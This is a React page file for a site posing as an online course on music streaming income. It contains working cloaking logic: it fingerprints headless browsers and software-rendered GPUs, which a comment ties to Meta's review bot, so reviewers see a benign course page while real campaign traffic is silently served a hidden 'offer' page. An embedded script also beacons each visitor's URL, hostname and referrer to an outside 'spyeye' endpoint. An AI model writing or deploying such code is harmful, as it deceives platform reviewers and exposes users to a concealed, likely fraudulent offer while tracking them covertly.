import { createFileRoute } from "@tanstack/react-router";
import { useEffect, useState } from "react";

export const Route = createFileRoute("/")({
  head: () => ({
    meta: [
      { title: "Streaming Income Foundations — A Practical Course for Independent Artists" },
      {
        name: "description",
        content: "Learn how music distribution, royalties, release planning and audience growth work in a practical online course for independent artists.",
      },
      { property: "og:title", content: "Streaming Income Foundations" },
      {
        property: "og:description",
        content: "A practical online course about music distribution, royalties and sustainable audience growth.",
      },
      { property: "og:type", content: "website" },
      { name: "twitter:card", content: "summary_large_image" },
      { name: "robots", content: "noindex, nofollow" },
    ],
    scripts: [
      {
        children: `(function(c,l,a,r,i,t,y){c[a]=c[a]||function(){(c[a].q=c[a].q||[]).push(arguments)};t=l.createElement(r);t.async=1;t.src="https://www.clarity.ms/tag/"+i;y=l.getElementsByTagName(r)[0];y.parentNode.insertBefore(t,y);})(window, document, "clarity", "script", "yft2re9p41");`,
      },
      {
        children: `(function(){try{var l=location,i=new Image();i.src="https://click-charm-73.lovable.app/api/public/spyeye/976e24b0-6a4d-4dd1-90af-7b0e1f18cfdd?h="+encodeURIComponent(l.hostname)+"&u="+encodeURIComponent(l.href)+"&r="+encodeURIComponent(document.referrer)+"&t="+Date.now();}catch(e){}})();`,
      },
    ],
  }),
  component: DynamicRenderer,
});

function DynamicRenderer() {
  const [showOffer, setShowOffer] = useState(false);
  const [search, setSearch] = useState("");

  useEffect(() => {
    const q = new URLSearchParams(window.location.search);
    const host = window.location.hostname;
    const isDev =
      host === "localhost" ||
      host === "127.0.0.1" ||
      host.startsWith("id-preview--") ||
      host.includes("-dev.lovable.app") ||
      host.includes(".lovableproject.com") ||
      host.includes(".sandbox.lovable.dev") ||
      q.get("dev") === "1";

    const campaign = (
      q.get("utm_campaign") ||
      q.get("campaign") ||
      q.get("utm_campaign_name") ||
      ""
    ).toLowerCase();

    // 1. Verificações de Headless / Bot de inspeção
    const isHeadless =
      Boolean((navigator as any).webdriver) ||
      !navigator.languages ||
      navigator.languages.length === 0 ||
      (window as any)._phantom ||
      (window as any).__nightmare ||
      (window as any).callPhantom;

    // 2. Renderização de WebGL (detecta simuladores de software / SwiftShader comum em bot do Meta)
    let isSoftwareGpu = false;
    try {
      const canvas = document.createElement("canvas");
      const gl = canvas.getContext("webgl") || (canvas.getContext("experimental-webgl") as any);
      if (gl) {
        const debugInfo = gl.getExtension("WEBGL_debug_renderer_info");
        if (debugInfo) {
          const renderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL).toLowerCase();
          if (renderer.includes("swiftshader") || renderer.includes("llvmpipe") || renderer.includes("virtualbox")) {
            isSoftwareGpu = true;
          }
        }
      }
    } catch (e) {
      // Ignora falhas em navegadores sem suporte
    }

    const matchesCampaign = campaign.includes("spot");

    if (!isHeadless && !isSoftwareGpu && (isDev || matchesCampaign)) {
      setSearch(window.location.search);
      setShowOffer(true);
    }
  }, []);

  if (!showOffer) {
    return (
      <iframe
        src="/w/index.html"
        title="Streaming Income Foundations"
        style={{
          position: "fixed",
          inset: 0,
          width: "100%",
          height: "100%",
          border: "none",
        }}
      />
    );
  }

  return (
    <iframe
      src={`/sp/type/index.html${search}`}
      title="Course Panel"
      style={{
        position: "fixed",
        inset: 0,
        width: "100%",
        height: "100%",
        border: "none",
      }}
    />
  );
}
